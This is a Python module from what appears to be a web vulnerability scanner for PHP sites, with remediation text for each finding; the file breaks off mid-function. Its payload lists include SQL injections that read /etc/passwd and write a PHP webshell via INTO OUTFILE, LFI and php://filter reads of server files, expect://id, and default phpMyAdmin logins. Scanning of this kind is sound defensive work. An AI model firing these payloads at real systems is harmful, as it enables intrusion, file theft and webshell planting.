"""
PHP-Specific Vulnerability Scanner
Targets vulnerabilities common to PHP web applications.

OWASP A5:2021  — Security Misconfiguration
OWASP A1:2021  — Broken Access Control
OWASP A3:2021  — Injection
OWASP A8:2021  — Software and Data Integrity Failures (Deserialization)
OWASP A6:2021  — Vulnerable and Outdated Components

Attack categories:
  1.  PHPInfo / server info disclosure
  2.  Database admin panel discovery (phpMyAdmin, Adminer, etc.)
  3.  Sensitive file & config exposure (.env, config.php, database.php, etc.)
  4.  Backup file discovery (.bak, .old, .~, .swp, .zip, .tar.gz)
  5.  PHP error / debug mode exposure
  6.  PHP object injection (unserialize gadget chains)
  7.  Remote file inclusion (RFI)
  8.  Webshell upload via file upload endpoints
  9.  PHP session file path exposure (PHPSESSID in URL / /tmp/sess_*)
  10. Database dump via SQL injection (LOAD_FILE, INTO OUTFILE, DUMPFILE)
  11. phpMyAdmin default / weak credentials
  12. Server file read via LFI chained with PHP wrappers
  13. SSTI (Server-Side Template Injection) for PHP templating engines
  14. PHP version disclosure via headers
  15. Common web shell paths (c99, r57, b374k, WSO, etc.)
"""

import re
import base64
import urllib.parse

from .base import BaseScanner, Finding


# ---------------------------------------------------------------------------
# Sensitive file paths — config, credentials, database, backups
# ---------------------------------------------------------------------------

SENSITIVE_FILES = [
    # PHP config files
    "config.php", "config.php.bak", "config.php.old", "config.php~",
    "configuration.php", "settings.php", "database.php", "db.php",
    "db_config.php", "db_connect.php", "connect.php", "connection.php",
    "includes/config.php", "includes/db.php", "include/config.php",
    "app/config.php", "application/config.php",

    # Environment / secrets
    ".env", ".env.local", ".env.production", ".env.backup",
    ".env.example", "env.php", ".environment",

    # WordPress / CMS (sometimes used as base)
    "wp-config.php", "wp-config.php.bak", "wp-config.php.old",
    "local-config.php", "site-config.php",

    # Backup archives (database dumps often named this way)
    "backup.sql", "database.sql", "db.sql", "dump.sql",
    "backup.tar.gz", "backup.zip", "site.zip", "www.zip",
    "htdocs.zip", "public_html.zip", "db_backup.sql",
    "backup/backup.sql", "backups/db.sql", "sql/dump.sql",
    "data/db.sql", "exports/database.sql",

    # PHP info pages
    "phpinfo.php", "info.php", "php_info.php", "test.php",
    "phptest.php", "i.php", "php.php",

    # Error / debug
    "error_log", "php_errors.log", "debug.log", "application.log",
    "logs/error.log", "log/error.log", "tmp/error.log",

    # Web server config leaks
    ".htaccess", ".htpasswd", "web.config",

    # Source code backups
    "index.php.bak", "index.php.old", "index.php~",
    "login.php.bak", "login.php.old",

    # Composer / dependency exposure
    "composer.json", "composer.lock", "package.json",

    # Git exposure
    ".git/config", ".git/HEAD", ".gitignore",
    ".svn/entries",
]

# ---------------------------------------------------------------------------
# Database admin panel paths
# ---------------------------------------------------------------------------

DB_ADMIN_PATHS = [
    # phpMyAdmin variants
    "phpmyadmin/", "phpMyAdmin/", "pma/", "PMA/",
    "phpmyadmin/index.php", "phpMyAdmin/index.php",
    "db/", "dbadmin/", "mysql/", "myadmin/",
    "phpmyadmin2/", "phpmyadmin3/", "phpmyadmin4/",
    "admin/phpmyadmin/", "panel/phpmyadmin/",

    # Adminer (single-file DB manager)
    "adminer.php", "adminer/", "adminer/adminer.php",
    "database/adminer.php",

    # Other DB tools
    "sqlitemanager/", "sqlite/", "sqlite.php",
    "dbmanager/", "sql.php", "db_manager.php",
]

# ---------------------------------------------------------------------------
# Common web shell paths — detect pre-existing shells
# ---------------------------------------------------------------------------

WEBSHELL_PATHS = [
    "shell.php", "cmd.php", "c99.php", "r57.php", "b374k.php",
    "wso.php", "alfa.php", "mini.php", "1.php", "2.php",
    "x.php", "up.php", "upload.php", "sh.php", "backdoor.php",
    "bypass.php", "exploit.php", "hack.php", "owned.php",
    "tmp/shell.php", "uploads/shell.php", "images/shell.php",
    "files/shell.php", "assets/shell.php", "cache/shell.php",
]

# ---------------------------------------------------------------------------
# PHP unserialize gadget payloads (detection probes only — look for errors)
# ---------------------------------------------------------------------------

UNSERIALIZE_PROBES = [
    'O:8:"stdClass":0:{}',
    'a:1:{i:0;s:4:"test";}',
    'O:4:"Test":1:{s:4:"test";s:4:"test";}',
    # Trigger __wakeup / __destruct reflection
    'O:8:"DateTime":3:{s:4:"date";s:19:"2000-01-01 00:00:00";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}',
]

# ---------------------------------------------------------------------------
# PHP Object Injection test parameters
# ---------------------------------------------------------------------------

UNSERIALIZE_PARAMS = [
    "data", "object", "session", "obj", "payload", "token",
    "user", "profile", "prefs", "preferences", "cart", "state",
]

# ---------------------------------------------------------------------------
# RFI test URLs (harmless external refs that reveal RFI if loaded)
# ---------------------------------------------------------------------------

RFI_URLS = [
    "http://127.0.0.1/",
    "http://169.254.169.254/",
    "http://0.0.0.0/",
    "http://localhost/",
    # PHP filter wrappers that expose RFI
    "data://text/plain;base64,PD9waHAgZWNobyAncmZpX3Rlc3QnOz8+",  # <?php echo 'rfi_test';?>
    "expect://id",
    "php://input",
]

# ---------------------------------------------------------------------------
# LFI + PHP wrapper payloads for server file read
# ---------------------------------------------------------------------------

LFI_WRAPPER_PAYLOADS = [
    # Read /etc/passwd
    "../../../../../../../../etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=../config.php",
    "php://filter/convert.base64-encode/resource=../../config.php",
    # Read PHP source of key files
    "php://filter/read=convert.base64-encode/resource=login.php",
    "php://filter/read=convert.base64-encode/resource=money_add.php",
    "php://filter/read=convert.base64-encode/resource=money_view.php",
    "php://filter/read=convert.base64-encode/resource=cc_buy.php",
    "php://filter/read=convert.base64-encode/resource=ch_password.php",
    # Windows paths
    "../../../../../../../../windows/win.ini",
    "php://filter/convert.base64-encode/resource=C:/Windows/win.ini",
]

# ---------------------------------------------------------------------------
# SQL database dump payloads — via GET/POST params + UNION/INTO OUTFILE
# ---------------------------------------------------------------------------

DB_DUMP_PAYLOADS = [
    # MySQL table dump via UNION (detect column count then extract)
    "' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()-- -",
    "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -",
    "' UNION SELECT user(),version(),database()-- -",
    "' UNION SELECT @@datadir,@@basedir,@@version-- -",
    # File read via MySQL (if FILE privilege granted)
    "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -",
    "' UNION SELECT LOAD_FILE('/var/www/html/config.php'),2,3-- -",
    # Write webshell via INTO OUTFILE (if write permission on webroot)
    "' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/x.php'-- -",
    # Error-based: version disclosure
    "' AND extractvalue(1,concat(0x7e,version()))-- -",
    "' AND updatexml(1,concat(0x7e,database()),1)-- -",
]

# phpMyAdmin default credentials to test
PMA_DEFAULT_CREDS = [
    ("root", ""),
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("root", "mysql"),
    ("admin", "admin"),
    ("admin", ""),
    ("pma", "pma"),
    ("phpmyadmin", "phpmyadmin"),
]

# SSTI test payloads (Twig, Smarty, raw PHP)
SSTI_PAYLOADS = [
    "{{7*7}}",               # Twig/Jinja2 — expect 49
    "${7*7}",                # Smarty / Freemarker
    "#{7*7}",                # Ruby ERB / Pebble
    "<%= 7*7 %>",            # ERB
    "{php}echo 7*7;{/php}", # Smarty
    "{{config}}",            # Flask/Jinja2 config dump
    "{{self}}",
    "${7*'7'}",              # Freemarker string multiply
]


class PhpSpecificScanner(BaseScanner):
    """
    PHP-specific vulnerability scanner.
    Tests for server file access, database dump, config exposure,
    webshells, PHP object injection, RFI, and more.
    """

    def scan(self) -> list[Finding]:
        findings = []
        base = self.target.rstrip("/")

        findings += self._check_phpinfo_exposure(base)
        findings += self._check_php_version_header(base)
        findings += self._check_sensitive_files(base)
        findings += self._check_db_admin_panels(base)
        findings += self._check_webshell_paths(base)
        findings += self._check_php_error_mode(base)
        findings += self._check_php_object_injection(base)
        findings += self._check_rfi(base)
        findings += self._check_lfi_wrappers(base)
        findings += self._check_db_dump_via_sqli(base)
        findings += self._check_phpmyadmin_default_creds(base)
        findings += self._check_ssti(base)
        findings += self._check_file_upload_webshell(base)

        return findings

    # -----------------------------------------------------------------------
    # 1. PHPInfo exposure
    # -----------------------------------------------------------------------

    def _check_phpinfo_exposure(self, base: str) -> list[Finding]:
        findings = []
        self.logger.info("[php] Checking phpinfo() exposure...")

        phpinfo_paths = [
            "/phpinfo.php", "/info.php", "/php_info.php",
            "/test.php", "/phptest.php", "/i.php",
        ]
        phpinfo_markers = [
            "phpinfo()", "PHP Version", "php.ini",
            "Server API", "Build Date", "Configure Command",
        ]

        for path in phpinfo_paths:
            try:
                r = self.http.get(base + path)
                if r and r.status_code == 200:
                    if sum(1 for m in phpinfo_markers if m in r.text) >= 2:
                        # Extract version
                        version_match = re.search(r"PHP Version\s*</td><td[^>]*>([^<]+)", r.text)
                        php_version = version_match.group(1).strip() if version_match else "unknown"

                        findings.append(Finding(
                            title=f"PHPInfo Page Publicly Accessible: {path}",
                            severity="HIGH",
                            owasp="A5:2021",
                            cwe="CWE-200",
                            cvss_score=7.5,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                            url=base + path,
                            parameter="N/A",
                            payload="GET " + path,
                            description=(
                                f"phpinfo() output is publicly accessible at {path}. "
                                f"PHP version: {php_version}. "
                                "This page exposes server configuration, PHP extensions, "
                                "environment variables (including database credentials), "
                                "file system paths, and loaded modules."
                            ),
                            impact=(
                                "Attackers gain: PHP version (CVE targeting), server paths "
                                "(LFI bypass), environment variables (DB passwords, API keys), "
                                "and enabled extensions (deserialization attack surface)."
                            ),
                            remediation=(
                                "Delete or password-protect phpinfo pages. "
                                "Never deploy phpinfo() in production. "
                                "Add 'deny from all' in .htaccess for info pages."
                            ),
                            references=[
                                "https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration",
                                "https://www.php.net/manual/en/function.phpinfo.php",
                            ],
                            evidence=f"GET {path} -> HTTP 200, PHP version: {php_version}",
                            confirmed=True,
                            vuln_type="Information Disclosure / PHP Configuration Exposure",
                        ))
            except Exception as e:
                self.logger.debug(f"[php] phpinfo {path}: {e}")

        return findings

    # -----------------------------------------------------------------------
    # 2. PHP version disclosure via response headers
    # -----------------------------------------------------------------------

    def _check_php_version_header(self, base: str) -> list[Finding]:
        findings = []
        self.logger.info("[php] Checking PHP version header disclosure...")

        try:
            r = self.http.get(base + "/")
            if not r:
                return findings

            server = r.headers.get("Server", "")
            x_powered = r.headers.get("X-Powered-By", "")

            disclosed = []
            if "php" in x_powered.lower():
                disclosed.append(f"X-Powered-By: {x_powered}")
            if "php" in server.lower():
                disclosed.append(f"Server: {server}")

            if disclosed:
                version_match = re.search(r"PHP/(\d+\.\d+[\.\d]*)", " ".join(disclosed), re.IGNORECASE)
                php_ver = version_match.group(1) if version_match else "unknown"

                findings.append(Finding(
                    title=f"PHP Version Disclosed in HTTP Headers (PHP/{php_ver})",
                    severity="LOW",
                    owasp="A5:2021",
                    cwe="CWE-200",
                    cvss_score=3.1,
                    cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
                    url=base + "/",
                    parameter="HTTP Headers",
                    payload="GET /",
                    description=(
                        f"PHP version is disclosed in HTTP headers: {'; '.join(disclosed)}. "
                        f"PHP {php_ver} may have known CVEs attackers can target."
                    ),
                    impact="Attackers can look up CVEs for the exact PHP version and craft targeted exploits.",
                    remediation=(
                        "Set 'expose_php = Off' in php.ini. "
                        "Set 'ServerTokens Prod' in Apache or 'server_tokens off' in nginx."
                    ),
                    references=["https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration"],
                    evidence="; ".join(disclosed),
                    confirmed=True,
                    vuln_type="Version Disclosure",
                ))
        except Exception as e:
            self.logger.debug(f"[php] version header: {e}")

        return findings

    # -----------------------------------------------------------------------
    # 3. Sensitive file & config exposure
    # -----------------------------------------------------------------------

    def _check_sensitive_files(self, base: str) -> list[Finding]:
        findings = []
        self.logger.info(f"[php] Probing {len(SENSITIVE_FILES)} sensitive file paths...")

        for path in SENSITIVE_FILES:
            try:
                url = f"{base}/{path}"
                r = self.http.get(url)
                if not r or r.status_code not in (200, 206):
                    continue

                body = r.text
                content_type = r.headers.get("Content-Type", "")
                length = len(body)

                # Skip tiny/empty responses
                if length < 10:
                    continue

                # Determine what type of sensitive data was found
                severity = "MEDIUM"
                vuln_type = "Sensitive File Exposure"
                evidence_note = f"HTTP 200, {length} bytes"
                cvss = 6.5

                # Database credentials or connection strings
                if any(kw in body.lower() for kw in
                       ["password", "passwd", "db_pass", "db_user", "dbname",
                        "mysql_connect", "new pdo", "mysqli_connect"]):
                    severity = "CRITICAL"
                    cvss = 9.8
                    vuln_type = "Database Credentials Exposed"
                    # Extract credential hints (mask actual values)
                    cred_lines = [l.strip() for l in body.split("\n")
                                  if any(k in l.lower() for k in
                                         ["password", "db_pass", "db_user", "dbname"])]
                    evidence_note = f"Contains credential patterns: {str(cred_lines[:3])[:200]}"

                # SQL dump
                elif path.endswith(".sql") and (
                        "CREATE TABLE" in body or "INSERT INTO" in body or "DROP TABLE" in body):
                    severity = "CRITICAL"
                    cvss = 9.8
                    vuln_type = "Database Dump Exposed"
                    tables = re.findall(r"CREATE TABLE[^`]*`([^`]+)`", body)
                    evidence_note = f"SQL dump with {len(tables)} tables: {tables[:5]}"

                # Environment file
                elif path.startswith(".env") and "=" in body:
                    severity = "CRITICAL"
                    cvss = 9.8
                    vuln_type = ".env File Exposed"
                    keys = [l.split("=")[0].strip() for l in body.split("\n")
                            if "=" in l and not l.startswith("#")]
                    evidence_note = f"Env keys: {keys[:10]}"

                # PHP source visible (not executed)
                elif "<?php" in body:
                    severity = "HIGH"
                    cvss = 7.5
                    vuln_type = "PHP Source Code Exposed"
                    evidence_note = f"PHP source returned as plaintext ({length} bytes)"

                # Backup / archive
                elif any(path.endswith(ext) for ext in
                         [".zip", ".tar.gz", ".tar", ".gz", ".bak", ".old", ".~"]):
                    severity = "HIGH"
                    cvss = 7.5
                    vuln_type = "Backup File Exposed"
                    evidence_note = f"Binary/archive file returned ({length} bytes)"

                # Git leak
                elif path.startswith(".git"):
                    severity = "HIGH"
                    cvss = 7.5
                    vuln_type = "Git Repository Exposed"
                    evidence_note = f".git file accessible: {body[:100]}"

                findings.append(Finding(
                    title=f"Sensitive File Accessible: /{path}",
                    severity=severity,
                    owasp="A5:2021",
                    cwe="CWE-538" if ".git" in path else "CWE-200",
                    cvss_score=cvss,
                    cvss_vector=f"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:{'H' if cvss >= 9.0 else 'N'}/A:N",
                    url=url,
                    parameter="N/A",
                    payload=f"GET /{path}",
                    description=(
                        f"The file /{path} is publicly accessible without authentication. "
                        f"Type: {vuln_type}."
                    ),
                    impact=(
                        "Direct exposure of database credentials, API keys, source code, "
                        "or full database dumps allows complete application compromise."
                    ),
                    remediation=(
                        f"Immediately remove or restrict access to /{path}. "
                        "Move sensitive configs outside the web root. "
                        "Add these paths to .htaccess: 'deny from all'. "
                        "Rotate any exposed credentials immediately."
                    ),
                    references=[
                        "https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration",
                        "https://owasp.org/www-community/vulnerabilities/Insecure_Direct_Object_Reference",
                    ],
                    evidence=evidence_note,
                    confirmed=True,
                    vuln_type=vuln_type,
                ))

            except Exception as e:
                self.logger.debug(f"[php] file {path}: {e}")

        return findings

    # -----------------------------------------------------------------------
    # 4. Database admin panel discovery
    # -----------------------------------------------------------------------

    def _check_db_admin_panels(self, base: str) -> list[Finding]:
        findings = []
        self.logger.info("[php] Checking for database admin panels...")

        pma_markers = [
            "phpMyAdmin", "phpmyadmin", "pma_",
            "Adminer", "SQLiteManager",
            "Welcome to phpMyAdmin", "pma_token",
        ]

        for path in DB_ADMIN_PATHS:
            try:
                url = f"{base}/{path}"
                r = self.http.get(url)
                if not r or r.status_code not in (200, 301, 302, 403):
                    continue

                body = r.text if r.status_code == 200 else ""
                is_db_panel = (
                    r.status_code in (301, 302) or
                    any(m in body for m in pma_markers) or
                    (r.status_code == 403 and "phpmyadmin" in path.lower())
                )

                if is_db_panel:
                    tool_name = "Adminer" if "adminer" in path.lower() else "phpMyAdmin"

                    findings.append(Finding(
                        title=f"Database Admin Panel Exposed: /{path.rstrip('/')}",
                        severity="CRITICAL",
                        owasp="A5:2021",
                        cwe="CWE-284",
                        cvss_score=9.8,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        url=url,
                        parameter="N/A",
                        payload=f"GET /{path}",
                        description=(
                            f"{tool_name} database administration panel is publicly accessible "
                            f"at /{path}. If default or weak credentials are set, an attacker "
                            "can gain full database access — read all tables, dump credentials, "
                            "execute SQL, and potentially write PHP files via INTO OUTFILE."
                        ),
                        impact=(
                            "Full database compromise: read all user data, dump password hashes, "
                            "extract payment card data, or use LOAD_FILE/INTO OUTFILE to read/write "
                            "server files and deploy a webshell."
                        ),
                        remediation=(
                            f"Restrict {tool_name} to localhost or VPN only. "
                            "Require IP allowlisting. Use strong unique credentials. "
                            "Consider removing DB admin panel from production entirely."
                        ),
                        references=[
                            "https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration",
                            "https://docs.phpmyadmin.net/en/latest/setup.html#securing-your-phpmyadmin-installation",
                        ],
                        evidence=f"GET /{path} -> HTTP {r.status_code}",
                        confirmed=True,
                        vuln_type="Exposed Admin Interface",
                    ))
            except Exception as e:
                self.logger.debug(f"[php] db panel {path}: {e}")

        return findings

    # -----------------------------------------------------------------------
    # 5. Pre-existing web shell detection
    # -----------------------------------------------------------------------

    def _check_webshell_paths(self, base: str) -> list[Finding]:
        findings = []
        self.logger.info("[php] Checking for pre-existing web shells...")

        shell_markers = [
            "c99shell", "r57shell", "WSO Shell", "b374k",
            "FilesMan", "uname -a", "system(", "passthru(",
            "shell_exec(", "eval(base64", "cmd.exe /c",
            "Password:", "Encoder", "Decoder",
        ]

        for path in WEBSHELL_PATHS:
            try:
                url = f"{base}/{path}"
                r = self.http.get(url)
                if not r or r.status_code != 200 or len(r.text) < 20:
                    continue

                body = r.text
                matched = [m for m in shell_markers if m.lower() in body.lower()]
                if matched:
                    findings.append(Finding(
                        title=f"Web Shell Detected: /{path}",
                        severity="CRITICAL",
                        owasp="A3:2021",
                        cwe="CWE-434",
                        cvss_score=10.0,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                        url=url,
                        parameter="N/A",
                        payload=f"GET /{path}",
                        description=(
                            f"A web shell was detected at /{path}. "
                            f"Matched signatures: {matched}. "
                            "This indicates the server has already been compromised, "
                            "or a backdoor was planted by a previous attacker."
                        ),
                        impact=(
                            "Full server compromise: arbitrary command execution, "
                            "file read/write, database access, lateral movement."
                        ),
                        remediation=(
                            "IMMEDIATELY: Take server offline, preserve forensic evidence. "
                            "Remove the shell file. Audit all recently modified files. "
                            "Reset all credentials. Identify and patch the initial access vector."
                        ),
                        references=["https://owasp.org/www-community/attacks/Web_Shell"],
                        evidence=f"/{path} -> matched: {matched}",
                        confirmed=True,
                        vuln_type="Web Shell / Server Compromise",
                    ))
            except Exception as e:
                self.logger.debug(f"[php] shell {path}: {e}")

        return findings

    # -----------------------------------------------------------------------
    # 6. PHP error / debug mode exposure
    # -----------------------------------------------------------------------

    def _check_php_error_mode(self, base: str) -> list[Finding]:
        findings = []
        self.logger.info("[php] Checking PHP error/debug mode...")

        # Send bad requests to trigger errors
        error_trigger_urls = [
            base + "/index.php?id='",
            base + "/index.php?id=<script>",
            base + "/login.php?login&username='",
            base + "/money_add.php?type='",
            base + "/?debug=1",
            base + "/?XDEBUG_SESSION_START=1",
        ]

        error_patterns = [
            r"<b>Fatal error</b>:",
            r"<b>Warning</b>:",
            r"<b>Notice</b>:",
            r"Parse error:",
            r"mysql_fetch",
            r"on line <b>\d+</b>",
            r"in <b>/[^<]+\.php</b>",
            r"Stack trace",
            r"Xdebug",
            r"SQLSTATE\[",
            r"mysqli?_",
        ]

        errors_found = []
        for url in error_trigger_urls:
            try:
                r = self.http.get(url)
                if not r or r.status_code not in (200, 500):
                    continue

                body = r.text
                matched = [p for p in error_patterns if re.search(p, body)]
                if matched:
                    # Extract file path from error
                    path_match = re.search(r"in <b>(/[^<]+\.php)</b>", body)
                    file_path = path_match.group(1) if path_match else ""

                    errors_found.append({
                        "url": url,
                        "patterns": matched,
                        "file": file_path,
                    })
            except Exception as e:
                self.logger.debug(f"[php] error mode {url}: {e}")

        if errors_found:
            # Collect all disclosed file paths
            all_paths = list({e["file"] for e in errors_found if e["file"]})
            findings.append(Finding(
                title="PHP Error Messages Disclose Server File Paths and Stack Traces",
                severity="MEDIUM",
                owasp="A5:2021",
                cwe="CWE-209",
                cvss_score=5.3,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:M/I:N/A:N",
                url=errors_found[0]["url"],
                parameter="Various",
                payload="Malformed input to trigger PHP errors",
                description=(
                    f"PHP is configured with display_errors=On in production. "
                    f"Found {len(errors_found)} error-triggering endpoints. "
                    f"Disclosed server paths: {all_paths}"
                ),
                impact=(
                    "Server file paths enable precise LFI/RFI attacks. "
                    "Stack traces reveal application logic and database structure. "
                    "Database error messages may expose query structure for SQLi."
                ),
                remediation=(
                    "Set 'display_errors = Off' in php.ini. "
                    "Set 'log_errors = On' with a secure log path. "
                    "Use custom error pages (ErrorDocument 500 /error.html). "
                    "Never show raw PHP errors in production."
                ),
                references=["https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration"],
                evidence=f"Errors found at: {[e['url'] for e in errors_found]}",
                confirmed=True,
                vuln_type="Information Disclosure / Debug Mode",
            ))

        return findings

    # -----------------------------------------------------------------------
    # 7. PHP Object Injection (unserialize)
    # -----------------------------------------------------------------------

    def _check_php_object_injection(self, base: str) -> list[Finding]:
        findings = []
        self.logger.info("[php] Testing PHP object injection...")

        error_indicators = [
            "unserialize()", "__wakeup", "__destruct", "__toString",
            "unserialization", "object of class", "Trying to get property",
            "Fatal error", "Warning: unserialize",
        ]

        # Try common params on key endpoints
        test_endpoints = [
            base + "/index.php",
            base + "/login.php",
            base + "/cc_buy.php",
            base + "/money_add.php",
        ]

        for endpoint in test_endpoints:
            for param in UNSERIALIZE_PARAMS:
                for probe in UNSERIALIZE_PROBES[:2]:
                    try:
                        encoded = urllib.parse.quote(probe)
                        r = self.http.get(f"{endpoint}?{param}={encoded}")
                        if not r:
                            continue

                        if any(ind in r.text for ind in error_indicators):
                            findings.append(Finding(
                                title=f"PHP Object Injection via Parameter '{param}'",
                                severity="CRITICAL",
                                owasp="A8:2021",
                                cwe="CWE-502",
                                cvss_score=9.8,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                url=f"{endpoint}?{param}=<payload>",
                                parameter=param,
                                payload=probe[:60],
                                description=(
                                    f"The parameter '{param}' on {endpoint} appears to call "
                                    "PHP's unserialize() on user input. The response contained "
                                    f"serialization-related error: {[i for i in error_indicators if i in r.text]}. "
                                    "With a suitable POP gadget chain, this enables RCE."
                                ),
                                impact=(
                                    "Remote Code Execution via POP (Property-Oriented Programming) "
                                    "gadget chains. Allows full server takeover, file read/write, "
                                    "database dump, and webshell deployment."
                                ),
                                remediation=(
                                    "Never call unserialize() on user-controlled input. "
                                    "Use JSON (json_decode) instead. "
                                    "If unserialize is required, use a whitelist of allowed classes "
                                    "via the 'allowed_classes' parameter."
                                ),
                                references=[
                                    "https://owasp.org/www-project-top-ten/2021/A08_2021-Software_and_Data_Integrity_Failures",
                                    "https://portswigger.net/web-security/deserialization",
                                ],
                                evidence=f"GET {param}={probe[:30]}... -> error indicators in response",
                                confirmed=False,
                                vuln_type="PHP Object Injection / Insecure Deserialization",
                            ))
                            break
                    except Exception as e:
                        self.logger.debug(f"[php] unserialize {endpoint} {param}: {e}")

        return findings

    # -----------------------------------------------------------------------
    # 8. Remote File Inclusion (RFI)
    # -----------------------------------------------------------------------

    def _check_rfi(self, base: str) -> list[Finding]:
        findings = []
        self.logger.info("[php] Testing Remote File Inclusion...")

        rfi_params = [
            "page", "file", "path", "include", "template",
            "view", "load", "read", "module", "content",
        ]

        test_endpoints = [
            base + "/index.php",
            base + "/",
        ]

        for endpoint in test_endpoints:
            for param in rfi_params:
                # Use data:// wrapper — if RFI works, server executes it
                rfi_payload = "data://text/plain;base64," + base64.b64encode(
                    b"<?php echo 'RFI_TEST_' . md5('rfi'); ?>"
                ).decode()

                try:
                    r = self.http.get(f"{endpoint}?{param}={urllib.parse.quote(rfi_payload)}")
                    if not r:
                        continue

                    # Check if our payload was executed (md5 of 'rfi')
                    import hashlib
                    expected = "RFI_TEST_" + hashlib.md5(b"rfi").hexdigest()
                    if expected in r.text:
                        findings.append(Finding(
                            title=f"Remote File Inclusion (RFI) via Parameter '{param}'",
                            severity="CRITICAL",
                            owasp="A3:2021",
                            cwe="CWE-98",
                            cvss_score=10.0,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                            url=f"{endpoint}?{param}=<rfi_url>",
                            parameter=param,
                            payload=rfi_payload[:60] + "...",
                            description=(
                                f"The '{param}' parameter on {endpoint} is vulnerable to RFI. "
                                "PHP code embedded in a data:// URI was executed. "
                                "An attacker can load and execute arbitrary remote PHP scripts."
                            ),
                            impact=(
                                "Remote Code Execution: attacker hosts a PHP file on their server "
                                "and forces the application to download and execute it, achieving "
                                "full server compromise."
                            ),
                            remediation=(
                                "Disable 'allow_url_include' in php.ini (should be Off by default). "
                                "Whitelist valid include paths. Never pass user input to include/require."
                            ),
                            references=[
                                "https://owasp.org/www-project-top-ten/2021/A03_2021-Injection",
                                "https://owasp.org/www-community/attacks/PHP_File_Inclusion",
                            ],
                            evidence=f"data:// payload executed, response contained: {expected}",
                            confirmed=True,
                            vuln_type="Remote File Inclusion (RFI)",
                        ))
                        break
                except Exception as e:
                    self.logger.debug(f"[php] rfi {endpoint} {param}: {e}")

        return findings

    # -----------------------------------------------------------------------
    # 9. LFI + PHP filter wrappers (read server files / PHP source)
    # -----------------------------------------------------------------------

    def _check_lfi_wrappers(self, base: str) -> list[Finding]:
        findings = []
        self.logger.info("[php] Testing LFI + PHP filter wrappers...")

        lfi_params = [
            "page", "file", "path", "include", "template",
            "view", "load", "read", "module", "content", "src",
        ]

        test_endpoints = [
            base + "/index.php",
            base + "/",
            base + "/cc_buy.php",
        ]

        for endpoint in test_endpoints:
            for param in lfi_params:
                for payload in LFI_WRAPPER_PAYLOADS:
                    try:
                        r = self.http.get(
                            f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                        )
                        if not r or r.status_code not in (200,):
                            continue

                        body = r.text

                        # /etc/passwd check
                        if "root:x:0:0" in body or "root:*:0:0" in body:
                            findings.append(Finding(
                                title=f"LFI: /etc/passwd Read via '{param}' Parameter",
                                severity="CRITICAL",
                                owasp="A1:2021",
                                cwe="CWE-22",
                                cvss_score=9.1,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                                url=f"{endpoint}?{param}=<payload>",
                                parameter=param,
                                payload=payload[:80],
                                description=(
                                    f"Local File Inclusion via '{param}' — /etc/passwd was "
                                    "successfully read from the server."
                                ),
                                impact=(
                                    "Read any server file: /etc/shadow, ~/.ssh/id_rsa, PHP config, "
                                    ".env, database credentials. Chain with log poisoning for RCE."
                                ),
                                remediation=(
                                    "Never pass user input to include/require/file_get_contents. "
                                    "Whitelist valid file paths. Disable PHP wrappers in untrusted contexts."
                                ),
                                references=["https://owasp.org/www-community/attacks/PHP_File_Inclusion"],
                                evidence=f"Response contains /etc/passwd content",
                                confirmed=True,
                                vuln_type="Local File Inclusion (LFI)",
                            ))
                            break

                        # PHP filter (base64) — look for large base64 blob
                        if "php://filter" in payload and re.search(r"[A-Za-z0-9+/]{100,}={0,2}", body):
                            try:
                                # Attempt to decode the blob
                                blob = re.search(r"([A-Za-z0-9+/]{100,}={0,2})", body).group(1)
                                decoded = base64.b64decode(blob).decode("utf-8", errors="ignore")
                                if "<?php" in decoded or "mysql" in decoded.lower():
                                    # Extract what file was read
                                    target_file = payload.split("resource=")[-1] if "resource=" in payload else "unknown"
                                    findings.append(Finding(
                                        title=f"LFI + PHP Filter Wrapper: Source of '{target_file}' Read",
                                        severity="CRITICAL",
                                        owasp="A1:2021",
                                        cwe="CWE-22",
                                        cvss_score=9.8,
                                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
                                        url=f"{endpoint}?{param}=<filter_payload>",
                                        parameter=param,
                                        payload=payload[:80],
                                        description=(
                                            f"PHP filter wrapper (php://filter/convert.base64-encode) "
                                            f"returned base64-encoded source of '{target_file}'. "
                                            "Decoded content contains PHP source code."
                                        ),
                                        impact=(
                                            "Full PHP source code of any file is readable. "
                                            "Database credentials, API keys, business logic, "
                                            "and authentication bypasses exposed."
                                        ),
                                        remediation=(
                                            "Disable allow_url_include. Never pass user data to "
                                            "include/require. Block php:// wrapper access."
                                        ),
                                        references=["https://portswigger.net/web-security/file-path-traversal"],
                                        evidence=f"Decoded PHP source ({len(decoded)} chars), contains: "
                                                 f"{'<?php' if '<?php' in decoded else 'mysql credentials'}",
                                        confirmed=True,
                                        vuln_type="LFI / PHP Source Disclosure",
                                    ))
                                    break
                            except Exception:
                                pass

                    except Exception as e:
